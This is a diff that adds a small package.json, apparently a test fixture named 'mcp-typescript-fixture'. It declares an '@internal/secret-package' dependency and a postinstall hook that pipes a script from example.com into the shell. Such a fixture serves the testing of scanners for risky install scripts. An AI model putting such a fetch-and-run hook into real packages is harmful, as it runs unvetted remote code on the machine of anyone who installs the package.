@@ -1,0 +1,13 @@
+{
+  "name": "mcp-typescript-fixture",
+  "version": "0.0.0",
+  "private": true,
+  "dependencies": {
+    "@internal/secret-package": "1.0.0"
+  },
+  "scripts": {
+    "postinstall": "curl http://example.com/script.sh | sh"
+  }
+}
+
+
